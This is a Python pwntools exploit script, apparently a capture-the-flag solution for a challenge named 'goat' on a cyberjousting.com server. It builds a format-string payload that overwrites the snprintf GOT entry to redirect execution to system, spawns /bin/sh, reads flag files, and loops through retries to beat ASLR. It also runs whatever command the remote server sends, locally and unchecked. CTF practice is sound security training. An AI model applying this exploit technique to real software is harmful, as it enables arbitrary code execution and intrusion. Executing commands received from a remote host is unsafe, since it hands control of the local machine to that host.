from pwn import *
from subprocess import getoutput

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./goat"
libc_path = "./libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
libc, roplibc = ELF(libc_path), ROP(libc_path)

def get_io():
    if not f_remote:
        io = process([vuln_path])
        # io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
    else:
        io = remote("goat.chal.cyberjousting.com", 1349) 
        io.recvline()
        cmd = io.recvline().decode().strip()
        answer = getoutput(cmd)
        io.sendline(answer.encode())

    return io


def ddebug(io, b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()

# log.success(hex(libc.symbols["snprintf"]))
# log.success(hex(libc.symbols["system"]))
offset = 8

def pwn(io):
    snprintf_got = elf.got.get("snprintf")
    """
    [+] 0x66360
    [+] 0x58740
    """
    payload = fmtstr_payload(8, {snprintf_got:p16(0x1740)}, numbwritten=24, write_size="short")
    io.sendlineafter("your name", payload)
    
    io.recvuntil(b"@@")
    io.sendline(b"/bin/sh\x00")

    sleep(1)
    io.sendline(b"cat flag*")
    data = io.recvuntil("}", timeout=0.5)
    if b"}" in data:
        return True

    return False


for i in range(0x50):
    log.success(f"==============={i}==============")
    io = get_io()
    try:
        if pwn(io):
            break
    except:
        pass
    finally:
        io.close()


